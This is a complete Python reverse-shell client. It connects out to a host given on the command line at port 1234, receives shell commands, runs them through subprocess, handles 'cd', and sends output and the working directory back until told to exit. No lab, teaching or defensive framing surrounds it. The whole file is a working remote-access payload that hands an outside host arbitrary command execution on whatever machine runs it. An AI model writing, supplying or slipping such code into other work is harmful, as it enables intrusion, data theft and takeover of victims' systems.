import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 1234
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"

s = socket.socket()

s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())
while True:
    
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        
        break
    if splited_command[0].lower() == "cd":
        
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            
            output = str(e)
        else:
            
            output = ""
    else:
        
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()
    
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()